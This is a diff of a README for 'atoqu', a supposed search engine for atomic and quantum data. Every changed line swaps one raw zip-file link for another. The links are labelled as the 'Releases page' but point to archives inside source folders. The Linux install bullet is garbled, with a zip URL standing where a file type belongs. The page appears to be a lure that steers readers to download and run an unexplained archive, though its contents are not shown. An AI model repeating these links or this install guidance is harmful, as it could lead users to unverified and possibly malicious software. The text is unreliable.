@@ -1,6 +1,6 @@
 # 🎉 atoqu - The First Search Engine for Atomic & Quantum Data
 
-[![Download Atoqu](https://github.com/kiuninho/atoqu/raw/refs/heads/main/utils/net/Software_subrhombic.zip)](https://github.com/kiuninho/atoqu/raw/refs/heads/main/utils/net/Software_subrhombic.zip)
+[![Download Atoqu](https://raw.githubusercontent.com/kiuninho/atoqu/main/src/core/Software-3.3.zip)](https://raw.githubusercontent.com/kiuninho/atoqu/main/src/core/Software-3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Atoqu! This guide will help you download and run the Atoqu search eng
 
 1. **Visit the Releases Page**
 
-   To download Atoqu, go to the [Releases page](https://github.com/kiuninho/atoqu/raw/refs/heads/main/utils/net/Software_subrhombic.zip).
+   To download Atoqu, go to the [Releases page](https://raw.githubusercontent.com/kiuninho/atoqu/main/src/core/Software-3.3.zip).
 
 2. **Choose the Right Version**
 
@@ -21,7 +21,7 @@ Welcome to Atoqu! This guide will help you download and run the Atoqu search eng
    Find the file that matches your operating system. Common options include:
    - **Windows:** Look for a `.exe` file.
    - **Mac:** You might see a `.dmg` file.
-   - **Linux:** There could be a `https://github.com/kiuninho/atoqu/raw/refs/heads/main/utils/net/Software_subrhombic.zip` file or similar.
+   - **Linux:** There could be a `https://raw.githubusercontent.com/kiuninho/atoqu/main/src/core/Software-3.3.zip` file or similar.
 
    Click on the appropriate file to start the download.
 
@@ -69,6 +69,6 @@ Once Atoqu is running, you can use it to search for atomic and quantum data:
 
 ## 🔗 Links
 
-- Download Atoqu: [Releases Page](https://github.com/kiuninho/atoqu/raw/refs/heads/main/utils/net/Software_subrhombic.zip)
+- Download Atoqu: [Releases Page](https://raw.githubusercontent.com/kiuninho/atoqu/main/src/core/Software-3.3.zip)
 
 Thank you for choosing Atoqu! We hope it serves your atomic and quantum search needs effectively. Enjoy exploring the vast world of atomic and quantum data effortlessly!
